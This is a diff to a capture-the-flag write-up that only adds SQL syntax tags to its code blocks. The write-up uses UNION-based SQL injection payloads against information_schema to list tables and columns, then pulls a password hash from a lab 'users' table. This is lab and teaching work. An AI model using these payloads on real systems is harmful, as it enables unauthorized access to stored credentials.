@@ -22,14 +22,14 @@ So by it means, in `information_schema`, all the information of the databases ca
 
 
 Following query will bring the information of all the tables created on the database
-```
+```sql
 1 AND 1=1 UNION SELECT 1, table_name FROM information_schema.tables
 ```
 and with the list of [General Table](https://dev.mysql.com/doc/refman/8.0/en/information-schema-general-table-reference.html), we can find the table `users` is listed on the result.
 
 From running this query, we can grab all the column names from each table, as well.
 
-```
+```sql
 1 AND 1=1 UNION SELECT table_name, column_name FROM information_schema.columns
 ```
 by searching the `users`, following columns are exist on the table `users`
@@ -40,13 +40,13 @@ user_id, first_name, last_name, town, country, planet, Commentaire, countersign
 
 By tring all the columns, with using columns `Commentaire`, and `Countersign`, the following message can be reterived, with this query
 
-```
+```sql
 1 AND 1=1 UNION SELECT Commentaire, countersign FROM users
 ```
 ![1 AND 1=1 UNION SELECT Commentaire, countersign FROM users](https://user-images.githubusercontent.com/22397481/209451385-c97a6a2b-0a89-440d-810d-5262b6d63877.jpeg)
 
 as it shows, let's decrypt the password
-```
+```sql
 ID: 1 AND 1=1 UNION SELECT Commentaire, countersign FROM users
 First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
 Surname : 5ff9d0165b4f92b14994e5c685cdce28
